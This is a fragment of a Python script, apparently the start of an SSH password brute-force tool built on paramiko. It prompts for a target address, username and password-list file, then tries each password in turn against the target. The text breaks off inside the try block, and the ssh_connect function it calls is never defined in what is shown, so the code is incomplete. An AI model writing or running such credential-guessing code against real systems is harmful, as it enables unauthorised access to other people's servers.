import paramiko, sys, os, socket, termcolor

host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Password file: ')

if not os.path.exists(input_file):
    print('[!!] That file/path doesnt exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            ssh_connect(password)